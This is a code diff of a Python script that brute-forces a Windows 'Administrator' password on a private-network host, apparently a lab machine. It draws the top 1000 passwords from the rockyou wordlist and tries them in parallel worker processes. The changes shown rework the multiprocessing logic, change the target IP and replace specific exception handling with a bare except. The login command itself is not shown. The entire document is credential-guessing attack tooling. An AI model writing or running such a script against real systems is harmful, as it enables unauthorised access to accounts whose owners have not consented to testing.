@@ -1,9 +1,10 @@
 import subprocess
 from multiprocessing import Pool, Manager, cpu_count
 from collections import Counter
+import time
 
-# Config
-target_ip = "192.168.137.128"
+# Configuration
+target_ip = "192.168.56.101"
 username = "Administrator"
 rockyou_path = "/usr/share/wordlists/rockyou.txt"
 top_n = 1000
@@ -17,9 +18,7 @@ def get_top_passwords(filepath, top_n):
     return [pw for pw, _ in counter.most_common(top_n)]
 
 # Worker function
-def attempt_login(args):
-    password, found_flag
-    = args
+def attempt_login(password, found_flag):
     if found_flag.value:
         return None
 
@@ -39,13 +38,11 @@ def attempt_login(args):
             with open(success_log, "w") as f:
                 f.write(f"{username}:{password}\n")
             return password
-    except subprocess.TimeoutExpired:
-        pass
-    except Exception:
+    except:
         pass
     return None
 
-# Main
+# Main Controller
 if __name__ == "__main__":
     print(f"[*] Extracting top {top_n} passwords...")
     passwords = get_top_passwords(rockyou_path, top_n)
@@ -53,22 +50,30 @@ if __name__ == "__main__":
     manager = Manager()
     found_flag = manager.Value('b', False)
 
-    print(f"[*] Starting brute-force with {len(passwords)} passwords...")
-    with Pool(processes=cpu_count() * 2) as pool:
-        try:
-            args = [(pw, found_flag) for pw in passwords]
-            for result in pool.imap_unordered(attempt_login, args):
-                if result:
-                    print(f"[+] Password cracked: {result}")
-                    pool.terminate()   # <<< Stop all workers
-                    pool.join()
-                    break
-        except KeyboardInterrupt:
-            print("\n[!] Interrupted by user.")
-            pool.terminate()
-        finally:
-            pool.close()
-            pool.join()
+    print(f"[*] Starting brute-force...")
+    pool = Pool(cpu_count() * 2)
+    jobs = []
+
+    try:
+        for pw in passwords:
+            if found_flag.value:
+                break
+            job = pool.apply_async(attempt_login, args=(pw, found_flag))
+            jobs.append(job)
+
+        for job in jobs:
+            if found_flag.value:
+                break
+            result = job.get()
+            if result:
+                print(f"[+] Cracked: {result}")
+                break
+
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted. Terminating...")
+    finally:
+        pool.terminate()
+        pool.join()
 
     if not found_flag.value:
         print("[-] Password not found.")
